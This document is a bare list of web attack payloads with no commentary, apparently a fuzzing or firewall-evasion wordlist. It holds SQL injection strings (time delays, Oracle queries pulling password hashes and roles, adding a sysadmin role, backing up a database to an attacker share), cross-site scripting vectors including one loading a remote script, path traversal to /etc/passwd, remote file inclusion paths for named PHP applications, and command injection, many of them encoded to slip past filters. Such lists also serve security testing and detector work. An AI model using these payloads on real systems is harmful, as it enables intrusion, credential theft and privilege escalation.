+%29%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%29%20%77%61%69%74%66%6F%72%20%64%65%6C%61%79%20%27%30%3A%30%3A%32%30%27%20%2F%2A
+<TABLE><TD /*!30323BACKGROUND="javascript:alert('XSS')">*/
+BACKUP+database+master+to+disks='\\<attackerip>\<attackerip>\backupdb.dat'
+<img%23IjdzAxpNqkj%0Asrc=javascript:alert(&quot;XSS&quot;)>
+JiNYMDAwMDAzQzs=
+/popup_window.php?site_isp_root LIKE XXpathXX?
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20/*%00
+%u0027%u0029%u0020%u0061%u006E%u0064%u0020%u0030%u003D%u0062%u0065%u006E%u0063%u0068%u006D%u0061%u0072%u006B%u0028%u0033%u0030%u0030%u0030%u0030%u0030%u0030%u002C%u004D%u0044%u0035%u0028%u0031%u0029%u0029%u0020%u0023
+%26%26+|+dir%23%0Ac:%2f
+'),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/* and '0having'='0having'
+(select--EaSAbOGjf%0Acount(*)--OrjDjn%0Afrom--NXOBpKzOyF%0Aall_users--YeWiQzUN%0At1,all_users--RaadoHR%0At2,all_users--kIdpzr%0At3,all_users--mmLCKb%0At4,all_users--RVogFlS%0At5)--mmkdcExun%0Aas--bGIcwWLG%0Atest
+%2F%72%61%6E%64%73%68%6F%70%2F%69%6E%64%65%78%2E%70%68%70%3F%69%6E%63%6C%3D%58%58%70%61%74%68%58%58%3F
+@variable%00
+%\%u%0%0%0%0%\%u%0%0%0%0
+%EF%BC%871%EF%BC%87OR%EF%BC%871∩
+"<?xml VERsIoN=""1.0"" encoding=""ISO-8859-1""?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>"
+%u002F%u002E%u002E%u002f%u007B%u0046%u0049%u004C%u0045%u007D
+L2xpYnNlY3VyZS5waHA/YWJzX3BhdGg9WFhwYXRoWFg/
+/upload/xax/ossigeno/admin/install_module.php?level=XXpathXX?%00
+%2F%61%64%6D%69%6E%69%73%74%72%61%74%6F%72%2F%63%6F%6D%70%6F%6E%65%6E%74%73%2F%63%6F%6D%5F%64%61%64%61%6D%61%69%6C%2F%63%6F%6E%66%69%67%2E%64%61%64%61%6D%61%69%6C%2E%70%68%70%3F%47%4C%4F%42%41%4C%53%5B%6D%6F%73%43%6F%6E%66%69%67%5F%61%62%73%6F%6C%75%74%65%5F%70%61%74%68%5D%3D%58%58%70%61%74%68%58%58
+%u002F%u0077%u0065%u0062%u0079%u0065%u0070%u002D%u0073%u0079%u0073%u0074%u0065%u006D%u002F%u0070%u0072%u006F%u0067%u0072%u0061%u006D%u006D%u002F%u0077%u0065%u0062%u0079%u0065%u0070%u002E%u0070%u0068%u0070%u003F%u0077%u0065%u0062%u0079%u0065%u0070%u005F%u0073%u0049%u006E%u0063%u006C%u0075%u0064%u0065%u0050%u0061%u0074%u0068%u003D%u0058%u0058%u0070%u0061%u0074%u0068%u0058%u0058%u003F
+%/%c%o%r%e%/%r%e%c%e%n%t%_%l%i%s%t%.%p%h%p%?%a%b%s%o%l%u%t%e%u%r%l%X%X%p%a%t%h%X%X
+%u002F%u006D%u0061%u0069%u006E%u002F%u0070%u0070%u0063%u0062%u0061%u006E%u006E%u0065%u0072%u0063%u006C%u0069%u0063%u006B%u002E%u0070%u0068%u0070%u003F%u0049%u004E%u0043%u003D%u0058%u0058%u0070%u0061%u0074%u0068%u0058%u0058%u003F
+/BetaBlockModules/GroupsCategoryModule/GroupsCategoryModule.php?path_prefix=XXpathXX and '0having'='0having'
+"),(SELESELECTCT%20if(count(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))--
+/settings.php?P[includes]=XXpathXX
+/.../.../.../.../.../.../.../.../{FILE} and '0having'='0having'
+%252F%2525%2532%2565%2525%2532%2565%2525%2535%2563%2525%2532%2565%2525%2532%2565%2525%2535%2563%2525%2532%2565%2525%2532%2565%2525%2535%2563%2525%2532%2565%2525%2532%2565%2525%2535%2563%2525%2532%2565%2525%2532%2565%2525%2535%2563%257B%2546%2549%254C%2545%257D
+/ch_readalso.php?read_xml_include=XXpathXX-- sp_password
+'/**/or/**/1=1/**/--
+%C0%AENULL%C0%AENULL%C0%AENULL%C0%AENULL%C0%AENULL%C0%AB%20waitfor%20delay%20%C0%AF0%C0%BA0%C0%BA20%C0%AF%20%C0%AF%C0%AA
+%C0%AE%C0%ABx003c%C0%BB
+/skin/dark/template.php?path=XXpathXX%00
+/ss/ss///{/etc/passwd}
+&lt;?%09echo('&lt;SCR)';
+%C0%AFcommon%C0%AFdb%C0%AEphp%C0%BFcommonpath%C0%BFXXpathXX%C0%BF
+%2F%66%69%6C%65%73%2F%6D%65%73%73%61%67%65%2D%66%6F%72%77%61%72%64%2E%70%68%70%33%3F%42%53%58%5F%4C%49%42%44%49%52%3D%58%58%70%61%74%68%58%58
+&%23dYSJyMM%0Aping%23mHslTVZ%0A-n%23ebAjIYVbu%0A30%23FJCgJrw%0A127.0.0.1%23BwCLSlXis%0A&
+)) and 0=benchmark(3000000,MD5(1))%20/*
+'%23%0AAND%23%0A1=utl_inaddr.get_host_address((SELECT%23%0ACOUNT(DISTINCT(GRANTED_ROLE))%23%0AFROM%23%0ADBA_ROLE_PRIVS%23%0AWHERE%23%0AGRANTEE=SYS.LOGIN_USER))%23%0AAND%23%0A'i'='i
+a%C0%AB%C0%FEid%C0%BB
+/%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\{FILE} and '0having'='0having'
+);waitfor+delay+'0:0:__TIME__'--
+%C0%AFf%C0%AFf%C0%AFf%C0%AFf%C0%AFf%C0%AFf%C0%AFf%C0%AFf%C0%AFf%C0%AFf%C0%AFf%C0%AFf%C0%AFf%C0%AFf%C0%AFf%C0%AFf%C0%AFf%C0%AFf%C0%AFf%C0%AFf%C0%AFf%C0%AFf%C0%AFf%C0%AFf%C0%AFf%C0%AFf%C0%AFf%C0%AFf%C0%AFf%C0%AFf%C0%AFf%C0%AFf%C0%AFf%C0%AFf%C0%AFf%C0%AFf%C0%AFf%C0%AFf%C0%AFf%C0%AFf%C0%AFf%C0%AFf%C0%AFf%C0%AFf%C0%AFf%C0%AFf%C0%AFf%C0%AFf%C0%AFf%C0%AFf%C0%AFf%C0%AFf%C0%AFf%C0%AFf
+1)%23hmHwgd%0Aor%23EVYonSvG%0Asleep(__TIME__)#
+"%0Aor%09sleep(__TIME__)#
+%2F%2f%2F
+'/**/or/**/1=1--/**/sp_password
+'+if(benchmark(3000000,MD5(1)),/*!NULL*/,/*!NULL*/),/*!NULL*/,/*!NULL*/,/*!NULL*/,/*!NULL*/,/*!NULL*/)%20%23
+%2539%2539%2539%2539%2522%257C%257C%2528%2573%2565%256C%2565%2563%2574%2520%2563%256F%2575%256E%2574%2528%252A%2529%2520%2566%2572%256F%256D%2520%2573%2579%2573%2569%2562%256D%252E%2573%2579%2573%2574%2561%2562%256C%2565%2573%2520%2561%2573%2520%2574%2531%252C%2573%2579%2573%2569%2562%256D%252E%2573%2579%2573%2574%2561%2562%256C%2565%2573%2520%2561%2573%2520%2574%2532%252C%2573%2579%2573%2569%2562%256D%252E%2573%2579%2573%2574%2561%2562%256C%2565%2573%2520%2561%2573%2520%2574%2533%2529%257C%257C%2522%2539%2539%2539%2539
+%5C%75%30%30%30%30
+/searchbot.php?pa/**/th=XXpa/**/thXX
+L2Vsc2VpZi9tb2R1bGVham91dGVyL2FydGljbGVzL2ZvbmN0aW9ucy5waHA/dHBlbHNlaWZwb3J0YWxyZXBlcnRvaXJlPVhYcGF0aFhY
+%C0%AF22%C0%DFultimate%C0%AFtemplates%C0%AFheader%C0%AEphp%C0%BFmainpath%C0%BFXXpathXX
+' exec sp_addsrvrolemember 'name' , 'sysadmin' --%00
+%u002F%u0030%u0078%u0032%u0065%u0030%u0078%u0032%u0065%u005C%u0030%u0078%u0032%u0065%u0030%u0078%u0032%u0065%u005C%u007B%u0046%u0049%u004C%u0045%u007D
+%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s-- sp_password
+<DIV /*!30902STYLE="width: expression(alert('XSS'));">*/
+)))/**/and/**/0=benchmark(3000000,MD5(1))%20/*
+/\\\%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c{FILE}
+%/%l%o%g%i%n%.%p%h%p%?%b%a%s%e%_%d%i%r%=%X%X%p%a%t%h%X%X
+'+;+drop+table+temp+--
+/network_module_selector.php?path_prefix LIKE XXpathXX
+'%09AND%091=utl_inaddr.get_host_address((SELECT%0ADISTINCT(PASSWORD)%09FROM%0A(SELECT%0DDISTINCT(PASSWORD),%0DROWNUM%0DAS%0CLIMIT%0DFROM%0CSYS.USER$)%0AWHERE%0CLIMIT=5))%0CAND%0A'i'='i
+%&%l%t%;%D%I%V %S%T%Y%L%E%=%\%"%b%a%c%k%g%r%o%u%n%d%-%i%m%a%g%e%&%#%5%8%;%\%0%0%7%5%\%0%0%7%2%\%0%0%6%C%\%0%0%2%8%'%\%0%0%6%a%\%0%0%6%1%\%0%0%7%6%\%0%0%6%1%\%0%0%7%3%\%0%0%6%3%\%0%0%7%2%\%0%0%6%9%\%0%0%7%0%\%0%0%7%4%\%0%0%3%a%\%0%0%6%1%\%0%0%6%c%\%0%0%6%5%\%0%0%7%2%\%0%0%7%4%\%0%0%2%8%&%#%4%6%;%1%0%2%7%\%0%0%5%8%&%#%4%6%;%1%0%5%3%\%0%0%5%3%\%0%0%2%7%\%0%0%2%9%'%\%0%0%2%9%\%"%&%g%t%;
+select /*!00000* from pg_shadow;*/
+%C0%AFclass%C0%AEmysql%C0%AEphp%C0%BFpath%C0%DFto%C0%DFbt%C0%DFdir%C0%BFXXpathXX
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*
+<DIV STYLE="background-image: url(javascript:alert('XSS'))"> and '0having'='0having'
+"+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20---- sp_password
+%u002F%u0062%u0075%u0074%u0074%u006F%u006E%u002F%u0073%u0065%u0074%u0074%u0069%u006E%u0067%u0073%u005F%u0073%u0071%u006C%u002E%u0070%u0068%u0070%u003F%u0070%u0061%u0074%u0068%u003D%u0058%u0058%u0070%u0061%u0074%u0068%u0058%u0058
+'--ZripBF%0Ahaving--qfEaoFTlWmaW%0A1=1--
+))) and 0=benchmark(3000000,MD5(1))%20%23
+\u003C-- sp_password
+/oneadmin/adminfoot.php?pATH[docroot]=XXpATHXX
+L3RoZW1lL3NldHRpbmdzLnBocD9wZmFkX3o9WFhwYXRoWFg=
+&#X3Csp_password
++i/**/f(benchmark(3000000,MD5(1)),NU/**/LL,NU/**/LL),NU/**/LL,NU/**/LL,NU/**/LL,NU/**/LL,NU/**/LL,NU/**/LL,NU/**/LL,NU/**/LL)%20--
+%C0%AFbp%C0%DFncom%C0%AEphp%C0%BFbnrep%C0%BFXXpathXX%C0%BF
+%C0%AFkmitaadmin%C0%AFkmitam%C0%AFhtmlcode%C0%AEphp%C0%BFfile%C0%BFXXpathXX%C0%BF
+%EF%BC%87+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20%23
+/..//..//..//..//..//..//..//{FILE}
+/classes/Auth/OpenID/Extension.php?_ENV[asicms][path]=XXpathXX and '0having'='0having'
+'    AND  1=utl_inaddr.get_host_address(( SELECT   DISTINCT(granted_role)    FROM    ( SELECT   DISTINCT(granted_role), ROWNUM   AS     LIMIT      FROM    dba_role_privs    WHERE   GRANTEE=SYS.LOGINUSER)    WHERE    LIMIT  =6))    AND  'i'='i
+/include/classes.php?INCLUDE_DIR=XXpathXX?%00
+y'+or+1=1+or+'y'='y
+%252F%2577%2565%2562%252F%2541%2564%256D%2569%256E%2569%2573%2574%2572%2561%2574%2569%256F%256E%252F%2549%256E%2563%256C%2575%2564%2565%2573%252F%2564%2565%256C%2565%2574%2565%2543%256F%256E%2574%2565%256E%2574%252E%2570%2568%2570%253F%2570%2561%2574%2568%255F%2570%2572%2565%2566%2569%2578%253D%2558%2558%2570%2561%2574%2568%2558%2558
+%C0%AFBetaBlockModules%C0%AFNewestGroupsModule%C0%AFNewestGroupsModule%C0%AEphp%C0%BFcurrent%C0%DFblockmodule%C0%DFpath%C0%BFXXpathXX
+?M=D
+/add_link.jsp?blog_theme=$$path$$
+/\\/\\..\/\\\/\\..\/\\\/\\\/\\\/\\..\/\\\/\\..\/\\\/\\\/\\\/\\..\/\\\/\\..\/\\\/\\\/\\\/\\..\/\\\/\\..\/\\\/\\\/\\\/\\{/\\/\\etc/\\/\\passwd}
+%/%a%d%m%i%n%i%s%t%r%a%t%o%r%/%c%o%m%p%o%n%e%n%t%s%/%c%o%m%_%c%h%r%o%n%o%c%o%n%t%a%c%t%/%e%x%c%e%l%w%r%i%t%e%r%/%P%P%S%.%p%h%p%?%m%o%s%C%o%n%f%i%g%_%a%b%s%o%l%u%t%e%_%p%a%t%h%=%X%X%p%a%t%h%X%X%?
+/index.php?main_tabid=1&main_content=XXpathXX and '0having'='0having'
+',NULL%09)%20waifor%20delay%20'0:0:20'%20/*
+(select--TgornNp%0Abenchmark(15000000,md5(0x4e446b6e))-9999)--ApgTdFTBr%0Aas--txAUetoTwTLn%0Atest
+%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%FBFILE%C0%FF
+<!--<img+src="--><img src=x onerror=alert(123)//">
+%2527%257C%257C%2555%2554%254C%255F%2548%2554%2554%2550%252E%2552%2545%2551%2555%2545%2553%2554
+%2F%69%6E%64%65%78%2E%70%68%70%3F%67%4F%6F%3D%58%58%70%61%74%68%58%58
+%252F%2563%256F%256D%2570%256F%256E%2565%256E%2574%2573%252F%2563%256F%256D%255F%2574%2568%256F%2570%2570%2565%2572%252F%2569%256E%2563%252F%2563%256F%256E%2574%2561%2563%2574%255F%2574%2579%2570%2565%252E%2570%2568%2570%253F%256D%256F%2573%2543%256F%256E%2566%2569%2567%255F%2561%2562%2573%256F%256C%2575%2574%2565%255F%2570%2561%2574%2568%253D%2558%2558%2570%2561%2574%2568%2558%2558
+(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3)%00
+%252F%2575%2572%256C%2569%256E%256E%255F%2569%256E%2563%256C%2575%2564%2565%2573%252F%2563%256F%256E%2566%2569%2567%252E%2570%2568%2570%253F%2564%2569%2572%255F%2577%2573%253D%2558%2558%2570%2561%2574%2568%2558%2558%253F
+'%05and%0B0=benchmark(3000000,MD5(1))%20--
+%u002F%u0069%u006E%u0064%u0065%u0078%u002E%u0070%u0068%u0070%u003F%u005F%u0052%u0045%u0051%u0055%u0045%u0053%u0054%u003D%u0026%u005F%u0052%u0045%u0051%u0055%u0045%u0053%u0054%u005B%u006F%u0070%u0074%u0069%u006F%u006E%u005D%u003D%u0063%u006F%u006D%u005F%u0063%u006F%u006E%u0074%u0065%u006E%u0074%u0026%u005F%u0052%u0045%u0051%u0055%u0045%u0053%u0054%u005B%u0049%u0074%u0065%u006D%u0069%u0064%u005D%u003D%u0031%u0026%u0047%u004C%u004F%u0042%u0041%u004C%u0053%u003D%u0026%u006D%u006F%u0073%u0043%u006F%u006E%u0066%u0069%u0067%u005F%u0061%u0062%u0073%u006F%u006C%u0075%u0074%u0065%u005F%u0070%u0061%u0074%u0068%u003D%u0058%u0058%u0070%u0061%u0074%u0068%u0058%u0058
+;echo--%0A111111
+PROPFIND%00
+/phpCards.header.php?CardPath=XXpathXX?
+%2F%64%69%61%6C%6F%67%73%2F%63%6F%6C%6C%6F%72%70%69%63%6B%65%72%2E%70%68%70%3F%73%70%61%77%5F%64%69%72%3D%58%58%70%61%74%68%58%58%26%63%6D%64%3D%69%64
+%252F%2574%2568%2565%256D%2565%252F%2574%2565%2573%2574%2533%252E%2570%2568%2570%253F%2572%256F%256F%2574%253D%2558%2558%2570%2561%2574%2568%2558%2558
+%C0%AFinclude%C0%AEphp%C0%BF%C0%DFAPP%C0%DFRELATIVE%C0%DFPATH%C0%BFXXpathXX
+%2F%69%6E%63%6C%75%64%65%2F%64%74%64%2E%70%68%70%3F%70%61%74%68%3D%58%58%70%61%74%68%58%58
+%61%29%3B%2F%75%73%72%2F%62%69%6E%2F%69%64%3B
+<DIV STYLE="background-image:\0075\0072\006C\0028%EF%BC%87\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029%EF%BC%87\0029">
+VERSION-CONTROL and '0having'='0having'
+VERSION%09-CONTROL
+%252F%2563%256F%256D%2570%256F%256E%2565%256E%2574%2573%252F%2563%256F%256D%255F%256C%256D%252F%2561%2572%2563%2568%2569%2576%2565%252E%2570%2568%2570%253F%256D%256F%2573%2543%256F%256E%2566%2569%2567%255F%2561%2562%2573%256F%256C%2575%2574%2565%255F%2570%2561%2574%2568%253D%2558%2558%2570%2561%2574%2568%2558%2558%253F
+/authentication/smf/smf.functions.php?pConfig_auth[smf_path] LIKE XXpathXX
+%252F%2569%256E%2564%2565%2578%252E%2570%2568%2570%253F%2570%256C%2575%2567%2569%256E%253D%2558%2558%2570%2561%2574%2568%2558%2558
+%C0%AFshow%C0%AEphp%C0%BFid%C0%BFXXpathXX
+<BR SIZE LIKE "&{alert('XSS')}">
+%u002F%u0073%u0065%u0072%u0076%u0069%u0063%u0065%u0073%u002E%u0070%u0068%u0070%u003F%u0070%u0061%u0067%u0065%u003D%u0058%u0058%u0070%u0061%u0074%u0068%u0058%u0058
+),(SElECT%20If(CounT(*)!=-1,benchmark(3000000,MD5(1)),benchmark(3000000,MD5(1))))%23
+%C0%AFweb%C0%AFBetaBlockModules%C0%AFUserMessagesModule%C0%AFUserMessagesModule%C0%AEphp%C0%BFpath%C0%DFprefix%C0%BFXXpathXX
++/*!if*/(benchmark(3000000,MD5(1)),/*!NULL*/,/*!NULL*/),/*!NULL*/)%20--
+/podcastgen1.0beta2/components/xmlparser/loadparser.php?absoluteurl=XXpathXX-- sp_password
+%C0%AFciamos%C0%DFpath%C0%AFmodules%C0%AFforum%C0%AFinclude%C0%AFconfig%C0%AEphp%C0%BFmodule%C0%DFcache%C0%DFpath%C0%BF%C0%AFXXpathXX%C0%AF
+'/*!AND*/1=utl_inaddr.get_host_address((/*!SELECT*//*!DISTINCT*/(USERNAME)/*!FROM*/(/*!SELECT*//*!DISTINCT*/(USERNAME), ROWNUM/*!AS*//*!LIMIT*//*!FROM*/SYS.ALL_USERS)/*!WHERE*//*!LIMIT*/=7))/*!AND*/'i'='i
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=6)) AND 'i'='i%00
+,NULL,NULL)%20waitfor%20delay%20%EF%BC%870:0:20%EF%BC%87%20/*
+select%0Ccurrent_setting('data_directory');
+%255C%2522%253B%2561%256C%2565%2572%2574%2528%2527%2558%2553%2553%2527%2529%253B%252F%252F
+%C0%AFauction%C0%AFincludes%C0%AFsettings%C0%AEinc%C0%AEphp%C0%BFinclude%C0%DFpath%C0%BFXXpathXX%C0%BF
+/biblioteca/lin_form.php?CLASSPATH=XXpathXX%00
+%2F%73%61%62%6C%6F%6E%6C%61%72%2F%67%75%6E%61%79%73%6F%66%74%2F%67%75%6E%61%79%73%6F%66%74%2E%70%68%70%3F%69%63%65%72%69%6B%79%6F%6C%75%3D%58%58%70%61%74%68%58%58
+%252F%256C%2569%2562%2573%252F%256C%256F%256D%252E%2570%2568%2570%253F%2545%2554%2543%2544%2549%2552%253D%2558%2558%2570%2561%2574%2568%2558%2558
+%u002F%u0073%u0063%u0072%u0069%u0070%u0074%u002F%u0069%u0064%u0065%u006E%u0074%u002F%u0069%u0064%u0065%u006E%u0074%u002E%u0069%u006E%u0063%u002E%u0070%u0068%u0070%u003F%u0070%u0061%u0074%u0068%u005F%u0069%u006E%u0063%u003D%u0058%u0058%u0070%u0061%u0074%u0068%u0058%u0058
+%252F%2525%2563%2530%2525%2561%2565%2525%2563%2530%2525%2561%2565%2525%2563%2531%2525%2539%2563%257B%2546%2549%254C%2545%257D
+%2F%6D%75%73%69%63%2F%62%75%79%63%64%2E%70%68%70%3F%48%54%54%50%5F%44%4F%43%55%4D%45%4E%54%5F%52%4F%4F%54%3D%58%58%70%61%74%68%58%58%3F
+%EF%BC%87/**/or/**/%EF%BC%87%EF%BC%87qwer%EF%BC%87%EF%BC%87/**/=/**/%EF%BC%87%EF%BC%87qwer%EF%BC%87%EF%BC%87
+select%23WzSebF%0Acurrent_setting('krb_server_keyfile');
+or%23EbIueLbKp%0A4479=4479%23XWpIFElkZK%0A#"
+/modules/birstday/birst.php?exbb[home_path]=XXpathXX?
+%/%\%.%.%/%\%.%.%/%\%.%.%/%\%.%.%/%\%.%.%/%\%.%.%/%{%F%I%L%E%}
+L2luZGV4LnBocD9zaXRlPVhYcGF0aFhY
+;--%0Aor--%0A'4479'='4479'
+' AND%091 LIKE utl_inaddr.get_host_address((SELECT%09DISTINCT(column_name) FROM%09(SELECT%09DISTINCT(column_name), ROWNUM AS%09LIMIT%09FROM%09all_tab_columns) WHERE%09LIMIT%09LIKE 6)) AND%09'i' LIKE 'i
+/lib/functions.php?DOC_ROOT LIKE XXpathXX
+L2luY191c2VyLnBocD9pbmNsdWRlX3BhdGg9WFhwYXRoWFg/
+%u002F%u0065%u006E%u0067%u0069%u006E%u0065%u002F%u0065%u006E%u0067%u0069%u006E%u0065%u002E%u0069%u006E%u0063%u002E%u0070%u0068%u0070%u003F%u0061%u0062%u0073%u006F%u006C%u0075%u0074%u0065%u005F%u0070%u0061%u0074%u0068%u003D%u0058%u0058%u0070%u0061%u0074%u0068%u0058%u0058
+%C0%AFg%C0%AFg%C0%AFg%C0%AFg%C0%AFg%C0%AFg%C0%AFg%C0%AFg%C0%AFg%C0%AFg%C0%AFg%C0%AFg%C0%AFg%C0%AFg%C0%AFg%C0%AFg%C0%AFg%C0%AFg%C0%AFg%C0%AFg%C0%AFg%C0%AFg%C0%AFg%C0%AFg%C0%AFg%C0%AFg%C0%AFg%C0%AFg%C0%AFg%C0%AFg%C0%AFg%C0%AFg%C0%AFg%C0%AFg%C0%AFg%C0%AFg%C0%AFg%C0%AFg%C0%AFg%C0%AFg%C0%AFg%C0%AFg%C0%AFg%C0%AFg%C0%AFg%C0%AFg%C0%AFg%C0%AFg%C0%AFg%C0%AFg%C0%AFg%C0%AFg%C0%AFg%C0%AFg
+%/%a%d%m%i%n%.%p%h%p%?%s%u%b%m%i%t%=%s%u%b%m%i%t%&%f%o%r%m%_%i%n%c%l%u%d%e%_%t%e%m%p%l%a%t%e%=%X%X%p%a%t%h%X%X
+1' /*!30430and 1=(select count(*) from tablenames); */--
+1 or 1 = 1
+/auth.header.inc.php?da_path=XXpathXX%00
+/\\/\\ss\/\\\/\\\/\\\/\\\/\\\/\\ss\/\\\/\\\/\\\/\\\/\\\/\\ss\/\\\/\\\/\\\/\\\/\\\/\\ss\/\\\/\\\/\\\/\\\/\\\/\\{/\\/\\etc/\\/\\passwd}
+%2F%61%64%6D%69%6E%2F%61%64%6D%69%6E%5F%66%6F%72%67%6F%74%74%65%6E%5F%70%61%73%73%77%6F%72%64%2E%70%68%70%3F%72%6F%6F%74%5F%66%6F%6C%64%65%72%5F%70%61%74%68%3D%58%58%70%61%74%68%58%58
+%/%w%e%b%/%B%e%t%a%B%l%o%c%k%M%o%d%u%l%e%s%/%L%o%g%i%n%M%o%d%u%l%e%/%r%e%m%o%t%e%a%u%t%h%_%f%u%n%c%t%i%o%n%s%.%p%h%p%?%p%a%t%h%_%p%r%e%f%i%x%=%X%X%p%a%t%h%X%X
+L2FkbWluaXN0cmF0b3IvY29tcG9uZW50cy9jb21fbW9zbWVkaWEvaW5jbHVkZXMvcHVyY2hhc2UuaHRtbC5waHA/bW9zQ29uZmlnX2Fic29sdXRlX3BhdGg9WFhwYXRoWFg=
+/%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9c{FILE} and '0having'='0having'
+/theme/settings.php?pfad_z=XXpathXX
+/forum/mail.php?repertorylevel LIKE XXpathXX?
+%u002F%u0073%u0074%u0079%u006C%u0065%u0073%u002F%u0064%u0065%u0066%u0061%u0075%u006C%u0074%u002F%u0067%u006C%u006F%u0062%u0061%u006C%u005F%u0068%u0065%u0061%u0064%u0065%u0072%u002E%u0070%u0068%u0070%u003F%u0069%u006E%u0073%u0074%u0061%u006C%u006C%u0065%u0064%u003D%u0032%u0033%u0026%u0064%u006F%u006D%u0061%u0069%u006E%u003D%u0058%u0058%u0070%u0061%u0074%u0068%u0058%u0058
+%C0%AF%C0%AF%C0%AE%C0%AE%C0%DE%C0%AF%C0%AE%C0%AE%C0%DE%C0%AF%C0%AE%C0%AE%C0%DE%C0%FBFILE%C0%FF
+<STYLE%0CTYPE="text/javascript">alert('XSS');</STYLE>
+'+/*!0if(benchmark(3000000,MD5(1)),/*!0NULL,/*!0NULL))%20--
+1%0Cwaitfor%0Edelay%0C'0:0:10'--
+%C0%AFmodernbill%C0%AFinclude%C0%AFhtml%C0%AFconfig%C0%AEphp%C0%BFDIR%C0%BFXXpathXX
+/Include/variables.jsp3?Include=$$path$$?
+%u002F%u0063%u0068%u0061%u0074%u002E%u0070%u0068%u0070%u003F%u006D%u0079%u005B%u0072%u006F%u006F%u0074%u005D%u003D%u0058%u0058%u0070%u0061%u0074%u0068%u0058%u0058%u003F%u0063%u006D%u003D%u0069%u0064
+/ocs/include/footer.inc.php?fullpath=XXpathXX? and '0having'='0having'
+#%0Bcredit%01to%04rsnake
+<![CDATA[<script>var%09n=0;while(true){n++;}</script>]]>
+/administrator/components/com_clickheat/includes/heatmap/_main.php?mosConfig_absolute_path LIKE XXpathXX
+;netstat--DIHaOwDPwO%0A-a;
+%252F%2566%256F%256F%2574%2565%2572%252E%2570%2568%2570%253F%2566%256F%256F%2574%2565%2572%255F%2566%2569%256C%2565%253D%2558%2558%2570%2561%2574%2568%2558%2558
+%/%e%r%r%o%r%s%.%p%h%p%?%e%r%r%o%r%=%X%X%p%a%t%h%X%X
+%/%i%n%c%l%u%d%e%/%l%i%v%r%e%_%i%n%c%l%u%d%e%.%p%h%p%?%n%o%_%c%o%n%n%e%c%t%=%l%o%l%&%c%h%e%m%_%a%b%s%o%l%u%=%X%X%p%a%t%h%X%X%?
+%252F%2577%2565%2562%252F%2542%2565%2574%2561%2542%256C%256F%2563%256B%254D%256F%2564%2575%256C%2565%2573%252F%2555%2570%256C%256F%2561%2564%254D%2565%2564%2569%2561%254D%256F%2564%2575%256C%2565%252F%2555%2570%256C%256F%2561%2564%254D%2565%2564%2569%2561%254D%256F%2564%2575%256C%2565%252E%2570%2568%2570%253F%2563%2575%2572%2572%2565%256E%2574%255F%2562%256C%256F%2563%256B%256D%256F%2564%2575%256C%2565%255F%2570%2561%2574%2568%2558%2558%2570%2561%2574%2568%2558%2558
+x'%0Cor%0Aname()='username'%09or%0C'x'='y
+<SCRIPT%23YyHOaLKjzlj%0ASRC="http://ha.ckers.org/xss.jpg"></SCRIPT>
+&lt;IMG%23UnQiTdAWNVL%0ASRC=\"javascript&#058;alert('XSS');\"&gt;
+'+or+'text'+=+n'text'
+'/**/or/**/4479/**/--'
+/BetaBlockModules/VideosMediaGalleryModule/VideosMediaGalleryModule.aspx?current_blockmodule_path=EEpathEE
+/mo/**/d/texte/index.php?config[pathMod]=XXpathXX
+%C0%AFweb%C0%AFBetaBlockModules%C0%AFMediaFullViewModule%C0%AFMediaFullViewModule%C0%AEphp%C0%BFpath%C0%DFprefix%C0%BFXXpathXX
+0x3fffffff%00
+1||;select/**/pg_sleep(2);/**/—
+%2F%2E%2E%5C%2E%2E%5C%5C%2E%2E%5C%2E%2E%5C%5C%2E%2E%5C%2E%2E%5C%5C%2E%2E%5C%5C%5C%7B%46%49%4C%45%7D
+select
+/administrator/components/com_jreactions/langset.php?comPath LIKE XXpathXX?
+\x27UNION SELECT
+%C0%AF%25c0%25ae%25c0%25ae%C0%AF%25c0%25ae%25c0%25ae%C0%AF%25c0%25ae%25c0%25ae%C0%AF%25c0%25ae%25c0%25ae%C0%AF%25c0%25ae%25c0%25ae%C0%AF%25c0%25ae%25c0%25ae%C0%AF%25c0%25ae%25c0%25ae%C0%AF%C0%FBFILE%C0%FF
+1;/*!0SELECT%20*
+onSubmit
+/.../.../{FILE}-- sp_password
